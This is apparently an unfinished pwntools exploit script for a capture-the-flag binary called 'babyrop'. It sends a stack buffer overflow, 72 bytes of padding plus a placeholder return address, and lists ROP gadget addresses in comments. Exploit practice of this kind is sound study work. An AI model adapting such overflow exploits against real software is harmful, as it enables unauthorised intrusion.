# =============================================================================

#!/usr/bin/python3
from pwn import *
context.log_level='debug'
import time

elf = context.binary = ELF("./babyrop")
libc = elf.libc

# =============================================================================

gs = '''
break 0x040116A
'''

# =============================================================================


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def setColor():
    io.sendline(color)

# =============================================================================

main = elf.symbols['main']

# =============================================================================

#rop

# 0x040116B _write
# 0x401160
#  

# 0x00001396: pop esi; pop edi; pop ebp; ret; 
# elf.symbols['pop_eax_int3'] = 0x13ad
# elf.symbols['pop_esi_edi_ebp'] = 0x1396

exp=""
pad1=b'A'*72
payload=p64(0xdeadbeaf)
exp=bytes(pad1)+payload
# =============================================================================


io = start()
io.recvuntil('Your name:')
# print('*'*80)
# time.sleep(0.25)
io.send(exp)

io.interactive()

# =============================================================================



# =============================================================================


